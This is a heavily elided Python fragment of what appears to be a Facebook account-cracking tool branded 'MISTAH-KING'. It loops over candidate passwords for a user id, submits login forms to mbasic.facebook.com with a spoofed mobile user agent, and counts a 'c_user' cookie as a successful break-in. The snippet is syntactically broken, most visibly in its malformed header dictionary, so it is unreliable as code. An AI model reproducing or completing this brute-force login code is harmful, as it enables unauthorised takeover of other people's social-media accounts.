...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'mbasic.facebook.com',
                          "method": 'GET',
                          "scheme": 'https',
    ...
    'user-agent': 'Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0',}
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write('\r \033[1;91m[\033[1;97mMISTAH-KING\033[1;91m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
        sys.stdout.flush()
    except:
        pass
